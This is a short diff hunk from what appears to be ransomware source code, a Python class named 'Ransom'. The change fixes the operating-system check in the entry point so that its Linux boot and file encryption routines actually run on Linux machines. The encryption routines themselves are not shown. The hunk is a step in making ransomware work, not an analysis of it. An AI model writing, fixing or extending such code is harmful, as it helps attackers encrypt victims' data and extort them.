@@ -126,7 +126,7 @@ class Ransom:
 
 if __name__ == "__main__":
     crypt = Ransom()
-    if sys.platform == "Linux":  # If os is special, remove this if
+    if sys.platform.startswith("linux") == True:  # If os is special, remove this if
         crypt.linuxboot_encrypt()
         crypt.linux_encrypt()
     if os.name == "nt":
